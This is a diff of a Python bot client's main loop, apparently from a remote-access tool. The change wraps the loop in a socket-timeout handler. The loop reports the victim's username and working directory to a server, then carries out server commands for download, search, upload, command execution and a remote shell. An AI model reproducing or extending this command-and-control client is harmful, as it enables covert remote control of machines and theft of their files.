@@ -512,61 +512,65 @@ def main():
                 break
     # Initialize the loop to handle bot commands
     while True:
-        # We first get our username and  working directory
-        user = getpass.getuser()
-        user_dir = os.getcwd()
-        data = user+';'+user_dir
-        data = data.encode()
-        # We send the information to the server
-        mysendall(mysocket, data, delimiter)
-        # We receive a command, then if it matches a key word
-        # complete the appropriate action
-        command = myrecvall(mysocket, delimiter).decode()
-        # create a list of words to stop the client
-        breaklist = ['dc','qt','ex']
-        # If the command is in the breaklist exit the client
-        if command.strip() in breaklist:
-            # if quit is received break loop and terminate connection to server
-            data = '{0}[!]{1} Connection terminated at client'.format(white, stop).encode()
+        try:
+            # We first get our username and  working directory
+            user = getpass.getuser()
+            user_dir = os.getcwd()
+            data = user+';'+user_dir
+            data = data.encode()
+            # We send the information to the server
             mysendall(mysocket, data, delimiter)
-            print('Done')
-            break
-        elif command[:2] == 'dl':
-            # If download is received, run download function
-            download(mysocket, delimiter)
-            # go back to beginning of loop
-            continue
-        elif command[:3] == 'src':
-            # If search is received, run search function
-            search(mysocket, delimiter)
-            # go back to beginning of loop
-            continue
-        elif command[:2] == 'ul':
-            # If upload is received run upload function
-            upload(mysocket, delimiter)
-            # go back to beginning of loop
-            continue
-        elif command[:3] == 'cmd':
-            data = '{0}[!]{1} Client ready for commands'.format(turquoise, stop).encode()
-            mysendall(mysocket, data, delimiter)
-            ask = myrecvall(mysocket, delimiter).decode()
-            if ask.strip() == 's':
-                # If command is received call the function above
-                commandant(mysocket, delimiter)
-                # Go back to the beginning of the loop
+            # We receive a command, then if it matches a key word
+            # complete the appropriate action
+            command = myrecvall(mysocket, delimiter).decode()
+            # create a list of words to stop the client
+            breaklist = ['dc','qt','ex']
+            # If the command is in the breaklist exit the client
+            if command.strip() in breaklist:
+                # if quit is received break loop and terminate connection to server
+                data = '{0}[!]{1} Connection terminated at client'.format(white, stop).encode()
+                mysendall(mysocket, data, delimiter)
+                print('Done')
+                break
+            elif command[:2] == 'dl':
+                # If download is received, run download function
+                download(mysocket, delimiter)
+                # go back to beginning of loop
                 continue
-            elif ask.strip() == 'm':
-                multi(mysocket, delimiter)
+            elif command[:3] == 'src':
+                # If search is received, run search function
+                search(mysocket, delimiter)
+                # go back to beginning of loop
                 continue
-        elif command[:2] == 'sh':
-            shell(mysocket, delimiter)
-            continue
-        elif command.strip() == '[-] ctrl+c':
-            myrecvall(mysocket,delimiter).decode()
-            data = b'[!] Client exit'
-            mysendall(mysocket, data, delimiter)
+            elif command[:2] == 'ul':
+                # If upload is received run upload function
+                upload(mysocket, delimiter)
+                # go back to beginning of loop
+                continue
+            elif command[:3] == 'cmd':
+                data = '{0}[!]{1} Client ready for commands'.format(turquoise, stop).encode()
+                mysendall(mysocket, data, delimiter)
+                ask = myrecvall(mysocket, delimiter).decode()
+                if ask.strip() == 's':
+                    # If command is received call the function above
+                    commandant(mysocket, delimiter)
+                    # Go back to the beginning of the loop
+                    continue
+                elif ask.strip() == 'm':
+                    multi(mysocket, delimiter)
+                    continue
+            elif command[:2] == 'sh':
+                shell(mysocket, delimiter)
+                continue
+            elif command.strip() == '[-] ctrl+c':
+                myrecvall(mysocket,delimiter).decode()
+                data = b'[!] Client exit'
+                mysendall(mysocket, data, delimiter)
+                sys.exit()
+                break
+        except socket.timeout:
+            mysocket.close()
             sys.exit()
-            break
 
 
 if __name__ == "__main__":
